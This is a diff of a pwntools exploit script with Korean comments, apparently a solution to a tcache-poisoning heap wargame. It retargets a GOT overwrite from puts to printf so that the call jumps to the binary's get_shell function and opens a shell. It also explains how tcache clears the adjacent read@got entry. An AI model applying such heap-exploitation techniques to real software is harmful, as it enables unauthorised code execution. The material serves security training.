@@ -22,7 +22,6 @@ def delete(idx):
     p.sendlineafter(b'idx: ', str(idx).encode())
 
 
-# malloc -> free를 2번 연속으로 해줘서 tc_idx = 2으로 만든 후, tcache_poisoning에서 tc_idx = 0이 되지 않도록 세팅
 # tcache[0x20] : empty
 # tc_idx = 0
 # chunk : ptr[0]
@@ -42,14 +41,14 @@ delete(0)
 delete(1)
 
 
-# tcache[0x20] : ptr[1] -> puts@got
+# tcache[0x20] : ptr[1] -> printf@got
 # tc_idx = 2
 # chunk : ptr[1]
-puts_got = elf.got['puts']
-modify(1, 0x10, p64(puts_got))
+printf_got = elf.got['printf']
+modify(1, 0x10, p64(printf_got))
 
 
-# tcache[0x20] : puts@got
+# tcache[0x20] : printf@got
 # tc_idx = 1
 # chunk : ptr[2]
 create(0x20, b'a')
@@ -60,15 +59,8 @@ create(0x20, b'a')
 # chunk : ptr[3]
 get_shell = elf.symbols['get_shell']
 create(0x20, p64(get_shell))
+# tcache에서 청크를 찾아서 할당할 때 해당 청크에 `e->key = NULL;`을 해서 `청크 + 0x8`을 `0x00`으로 초기화하기 때문에,
+# 여기서 printf@got를 할당할 때, [printf@got + 0x8]에 위치하는 read@got의 값이 NULL(0x00)으로 바뀜
+# tcache_dup 워게임에서는 printf@got 뒤에 alarm@got가 존재해서 상관없지만, 여기서는 create 내부에서 read로 데이터에 get_shell을 대입해야 하므로 read@got를 수정하면 안됨
 
 p.interactive()
-
-# 일반적으로, got_overwrite에 성공하였으나 공격이 실패하는 경우는 아래와 같습니다.
-
-# 함수 호출 시 인자가 올바르지 않은 경우.
-
-# 예를 들어, printf("%s", &a)의 printf got를 system()으로 덮은 경우, system("%s")가 실행되어 공격에 실패합니다.
-# stack 정렬이 되어 있지 않아, xmm오류가 발생하는 경우
-
-# 일반적으로, 함수의 시작점으로 got를 덮은 경우 오류가 발생하지 않습니다. 다만 함수의 중간으로 이동하는 경우 해당 오류가 발생할 수 있습니다.
-# 위 두 내용을 염두하여, gdb로 동작을 확인해보면 문제를 해결할 수 있을 것으로 보입니다!
